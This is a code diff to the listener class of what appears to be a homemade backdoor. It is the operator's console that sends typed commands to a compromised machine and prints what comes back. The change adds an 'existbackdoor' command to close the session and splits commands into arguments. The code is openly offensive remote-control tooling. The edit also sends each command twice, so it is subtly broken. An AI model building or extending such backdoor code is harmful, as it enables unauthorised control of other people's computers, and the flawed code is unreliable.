@@ -29,11 +29,16 @@ class Listener:
 
     def execute_remotely(self, command):
         self.reliable_send(command)
+        if command[0] == "existbackdoor":
+            self.connection.close()
+            exit()
+        self.reliable_send(command)
         return self.reliable_receive()
 
     def run(self):
         while True:
             command = input(">> ")
+            command=command.split(" ")
             result = self.execute_remotely(command)
             print(result)
 
